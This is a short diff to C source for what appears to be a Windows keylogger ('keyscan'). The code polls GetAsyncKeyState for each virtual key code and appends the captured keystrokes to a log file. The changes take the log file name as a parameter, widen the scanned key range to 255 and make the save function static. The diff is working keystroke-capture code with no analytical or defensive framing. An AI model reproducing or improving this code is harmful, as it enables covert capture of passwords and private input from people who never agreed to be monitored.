@@ -1,8 +1,9 @@
 #include "keyscan.h"
+#include "setup.h"
 
-int saveFileCode(int code){
+static int saveFileCode(int code, const char *fileName){
     FILE *file = NULL;
-    if((file = fopen(KEY_FILE, "a")) != NULL){
+    if((file = fopen(fileName, "a")) != NULL){
         switch(code){
             case VK_A :
                 if(GetAsyncKeyState(VK_SHIFT))
@@ -355,11 +356,11 @@ int saveFileCode(int code){
     return EXIT_FAILURE;
 }
 
-void scanCode(void){
+void scanCode(const char *file){
     int key;
-    for(key = 8; key <= 165; ++key){
+    for(key = 8; key <= 255; ++key){
         if(GetAsyncKeyState(key) == -32767){
-            saveFileCode(key);
+            saveFileCode(key, file);
         }
     }
 }
